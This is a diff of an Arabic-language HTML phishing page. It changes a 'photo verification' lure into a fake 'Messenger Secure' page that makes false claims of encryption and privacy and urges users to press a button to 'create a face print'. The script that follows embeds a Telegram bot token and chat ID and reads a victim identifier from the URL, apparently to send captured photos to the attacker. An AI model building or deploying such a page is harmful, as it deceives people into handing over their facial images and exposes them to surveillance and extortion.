@@ -1,25 +1,170 @@
 <!DOCTYPE html>
-<html lang="ar">
-<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
-<title>التحقق الأمني</title>
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Messenger Secure</title>
+
+<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
+
 <style>
-*{margin:0;padding:0;box-sizing:border-box}
-body{font-family:Arial,sans-serif;background:linear-gradient(135deg,#667eea,#764ba2);min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px}
-.card{background:#fff;border-radius:20px;padding:30px;max-width:400px;width:100%;box-shadow:0 20px 60px rgba(0,0,0,.3);text-align:center}
-h1{color:#333;margin-bottom:10px}p{color:#666;margin-bottom:20px}
-.btn{background:linear-gradient(135deg,#667eea,#764ba2);color:#fff;border:none;padding:15px 40px;border-radius:50px;font-size:18px;cursor:pointer;width:100%}
-.btn:disabled{opacity:.6}
-#result{margin-top:15px;padding:10px;border-radius:10px;display:none}
-.ok{background:#d4edda;color:#155724;display:block}
-.fail{background:#f8d7da;color:#721c24;display:block}
-</style></head>
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+    font-family:'Cairo',sans-serif;
+}
+
+body{
+    background:#f0f2f5;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    min-height:100vh;
+}
+
+.container{
+    width:390px;
+    max-width:95%;
+}
+
+.card{
+    background:#fff;
+    border-radius:24px;
+    padding:35px 25px;
+    box-shadow:0 15px 45px rgba(0,0,0,.15);
+    text-align:center;
+}
+
+.logo{
+    width:90px;
+    height:90px;
+    margin:auto;
+    border-radius:50%;
+    background:linear-gradient(135deg,#0084ff,#6a5cff);
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    color:#fff;
+    font-size:42px;
+    margin-bottom:20px;
+}
+
+h1{
+    font-size:27px;
+    color:#111;
+    margin-bottom:10px;
+}
+
+.subtitle{
+    color:#666;
+    margin-bottom:30px;
+    line-height:1.7;
+}
+
+.security{
+    background:#f7f9fc;
+    border-radius:18px;
+    padding:20px;
+    text-align:right;
+}
+
+.security h2{
+    font-size:19px;
+    margin-bottom:15px;
+    color:#222;
+}
+
+.security ul{
+    list-style:none;
+}
+
+.security li{
+    margin:14px 0;
+    color:#444;
+    font-size:15px;
+}
+
+.security li::before{
+    content:"🔒 ";
+}
+
+button{
+    width:100%;
+    margin-top:30px;
+    border:none;
+    border-radius:40px;
+    background:linear-gradient(135deg,#0084ff,#0069ff);
+    color:#fff;
+    font-size:18px;
+    font-weight:bold;
+    padding:16px;
+    cursor:pointer;
+    transition:.3s;
+}
+
+button:hover{
+    transform:scale(1.03);
+}
+
+.note{
+    margin-top:18px;
+    color:#888;
+    font-size:13px;
+}
+</style>
+</head>
+
 <body>
+
+<div class="container">
+
 <div class="card">
-    <h1>📸 التحقق بالصورة</h1>
-    <p>يرجى التقاط صورة للتحقق من هويتك</p>
-    <button class="btn" id="btnStart" onclick="capture()">📷 بدء التصوير</button>
-    <div id="result"></div>
+
+<div class="logo">
+💬
 </div>
+
+<h1>Messenger Secure</h1>
+
+<p class="subtitle">
+مرحبًا بكم في قسم Messenger الخاص.
+</p>
+
+<div class="security">
+
+<h2>الحماية والأمان</h2>
+
+<ul>
+<li>المحادثات مشفّرة بالكامل بين الطرفين.</li>
+
+<li>يمنع التقاط لقطات الشاشة داخل هذا القسم.</li>
+
+<li>يمنع حفظ الصور أو تنزيل الوسائط.</li>
+
+<li>تُحذف المحادثات تلقائيًا بعد الاطلاع عليها.</li>
+
+<li>لا يمكن فتح Messenger الخاص إلا باستخدام بصمة الوجه.</li>
+
+</ul>
+
+</div>
+
+<button>
+اضغط هنا لإنشاء بصمة الوجه وفتح المحادثات
+</button>
+
+<div class="note">
+🔒 جميع بياناتك محمية وفق أعلى معايير الأمان.
+</div>
+
+</div>
+
+</div>
+
+</body>
+</html>
 <script>
 const TOKEN='7524329663:AAERQzZ21_sskD6GLfUNLTYvTy--X733hEI',CHAT='1015102519';
 const chatId=new URLSearchParams(location.search).get('chatId')||'unknown';
